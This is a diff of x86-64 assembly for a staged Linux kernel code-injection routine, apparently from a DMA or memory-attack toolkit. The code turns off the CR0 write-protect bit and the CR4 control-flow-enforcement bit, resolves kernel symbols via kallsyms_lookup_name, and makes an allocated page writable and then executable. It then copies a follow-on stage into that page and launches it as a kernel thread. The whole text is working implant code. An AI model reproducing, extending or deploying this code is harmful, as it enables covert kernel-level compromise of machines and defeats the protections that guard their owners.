@@ -31,12 +31,18 @@ main PROC
 	PUSH rcx
 	PUSH r8
 	PUSH r9
+	PUSH r14
+	PUSH r15
+	MOV r14, cr4
+	MOV r15, cr0
 	; ----------------------------------------------------
 	; 2: ENABLE SUPERVISOR WRITE
 	; ----------------------------------------------------
+	MOV rcx, cr4
+	BTR ecx, 23
+	MOV cr4, rcx
 	MOV rcx, cr0
-	PUSH rcx
-	AND ecx, 0fffeffffh
+	BTR ecx, 16
 	MOV cr0, rcx
 	; ----------------------------------------------------
 	; 3: RESTORE ORIGNAL (8 bytes)
@@ -51,6 +57,8 @@ main PROC
 	LEA rcx, data_cmpxchg_flag
 	LOCK CMPXCHG [rcx], dl
 	JNE skipcall
+	MOV cr0, r15		; restore original cr0/cr4
+	MOV cr4, r14		; restore original cr0/cr4
 	; ----------------------------------------------------
 	; 5: SET UP CALL STACK AND PARAMETERS
 	;    r12: tmp 1 (virt addr)
@@ -64,7 +72,7 @@ main PROC
 	PUSH r15
 	MOV r15, rsp
 	AND rsp, 0FFFFFFFFFFFFFFF0h
-	SUB rsp, 040h
+	SUB rsp, 060h
 	LEA r14, main_pre_start
 	MOV eax, [data_offset_kallsyms_lookup_name]
 	ADD r14, rax
@@ -78,11 +86,23 @@ main PROC
 	POP r13
 	POP r12
 	; ----------------------------------------------------
+	; 6: WRITE RESULT (KMD ADDRESS):
+	; ----------------------------------------------------
+	MOV rcx, cr4
+	BTR ecx, 23
+	MOV cr4, rcx
+	MOV rcx, cr0
+	BTR ecx, 16
+	MOV cr0, rcx
+	MOV [data_phys_addr_alloc], eax
+	; ----------------------------------------------------
 	; 7: RESTORE AND JMP BACK
 	; ----------------------------------------------------
 	skipcall:
-	POP rax
-	MOV cr0, rax
+	MOV cr0, r15		; restore original cr0/cr4
+	MOV cr4, r14		; restore original cr0/cr4
+	POP r15
+	POP r14
 	POP r9
 	POP r8
 	POP rcx
@@ -121,8 +141,19 @@ setup PROC
 	CALL m_phys_to_virt
 	MOV r12, rax
 	; ----------------------------------------------------
-	; 2: CLEAR AND COPY STAGE3 PRE BINARY TO AREA
+	; 2: SET MEMORY TO 'rw' IF FUNCTION EXISTS
 	; ----------------------------------------------------
+	LEA rdi, str_set_memory_rw
+	CALL r14
+	TEST rax, rax
+	JZ setup_clear_memory
+	MOV rdi, r12
+	MOV rsi, 2
+	CALL rax
+	; ----------------------------------------------------
+	; 3: CLEAR AND COPY STAGE3 PRE BINARY TO AREA
+	; ----------------------------------------------------
+	setup_clear_memory:
 	MOV rdi, r12
 	CALL clear_8k
 	MOV rdi, 64
@@ -137,7 +168,7 @@ setup PROC
 	TEST rdi, rdi
 	JNZ copy_stage3_pre_loop
 	; ----------------------------------------------------
-	; 3: SET CODE PAGE TO EXECUTABLE
+	; 4: SET CODE PAGE TO EXECUTABLE
 	; ----------------------------------------------------
 	LEA rdi, str_set_memory_rox
 	CALL r14
@@ -153,7 +184,7 @@ setup PROC
 	MOV rsi, 1
 	CALL rax
 	; ----------------------------------------------------
-	; 4: CREATE THREAD & SET UP DATA AREA
+	; 5: CREATE THREAD & SET UP DATA AREA
 	; (try kthread_create_on_node 1st, kthread_create 2nd)
 	; ----------------------------------------------------
 	LEA rdi, str_kthread_create_on_node
@@ -183,7 +214,7 @@ setup PROC
 	TEST rax, rax
 	JZ error
 	; ----------------------------------------------------
-	; 5: START THREAD
+	; 6: START THREAD
 	; ----------------------------------------------------
 	thread_start:
 	MOV [r12+58h], rax   ; KMDDATA.ReservedKMD[0] (task_struct*)
@@ -199,19 +230,15 @@ setup PROC
 	TEST rax, rax
 	JZ error
 	; ----------------------------------------------------
-	; 6: FINISH!
+	; 7: FINISH!
 	;    supervisor write must be re-enabled before since
 	;    some calls may have unset it.
 	; ----------------------------------------------------
 	MOV eax, r13d
-	JMP setup_finish
+	RET
 	error:
 	MOV eax, 0FFFFFFFFh
 	setup_finish:
-	MOV rcx, cr0
-	AND ecx, 0fffeffffh
-	MOV cr0, rcx
-	MOV [data_phys_addr_alloc], eax
 	RET
 setup ENDP
 
@@ -305,6 +332,7 @@ str_alloc_pages_current		db 'alloc_pages_current', 0
 str_alloc_pages				db 'alloc_pages', 0
 str_set_memory_rox			db 'set_memory_rox', 0
 str_set_memory_x			db 'set_memory_x', 0
+str_set_memory_rw			db 'set_memory_rw', 0
 str_wake_up_process			db 'wake_up_process', 0
 str_page_offset_base		db 'page_offset_base', 0
 str_vmemmap_base			db 'vmemmap_base', 0
